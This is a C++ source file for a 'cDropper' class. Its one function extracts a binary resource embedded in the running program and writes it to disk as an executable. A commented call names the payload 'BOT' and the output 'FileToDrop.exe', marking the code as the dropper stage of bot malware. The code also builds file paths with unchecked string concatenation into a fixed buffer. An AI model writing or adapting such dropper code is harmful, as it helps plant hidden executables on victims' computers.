#include "cDropper.h"

#include "resource.h"
#include <windows.h>
#include <tchar.h>
#include <stdlib.h>
#include <stdio.h>
#include <strsafe.h>
#pragma comment (lib, "kernel32.lib")
#pragma comment (lib, "user32.lib")
#pragma comment(lib,"shell32.lib")


cDropper::cDropper()
{
	//decompress_sysfile(L"BOT", L"BINARY", L"FileToDrop.exe");
}

bool cDropper::decompress_sysfile(wchar_t* name, wchar_t* type, wchar_t* filename)
{
	HRSRC aResourceH;
	HGLOBAL aResourceHGlobal;
	unsigned char* aFilePtr;
	unsigned long aFileSize;
	HANDLE file_handle;

	//////////////////////////////////////////////////////////
	// locate a named resource in the current binary EXE
	//////////////////////////////////////////////////////////
	aResourceH = FindResource(NULL, name, type);
	if (!aResourceH)
	{
		return false;
	}

	aResourceHGlobal = LoadResource(NULL, aResourceH);
	if (!aResourceHGlobal)
	{
		return false;
	}

	aFileSize = SizeofResource(NULL, aResourceH);
	aFilePtr = (unsigned char*)LockResource(aResourceHGlobal);
	if (!aFilePtr)
	{
		return false;
	}
	wchar_t filepath[255];
	GetCurrentDirectory(255, filepath);
	lstrcat(filepath, L"\\");
	lstrcat(filepath, filename);
	file_handle =
		CreateFile(
			filepath,
			FILE_ALL_ACCESS,
			0,
			NULL,
			CREATE_ALWAYS,
			0,
			NULL);

	if (INVALID_HANDLE_VALUE == file_handle)
	{
		return false;
	}

	while (aFileSize--)
	{
		unsigned long numWritten;
		WriteFile(file_handle, aFilePtr, 1, &numWritten, NULL);
		aFilePtr++;
	}
	CloseHandle(file_handle);

	return true;
}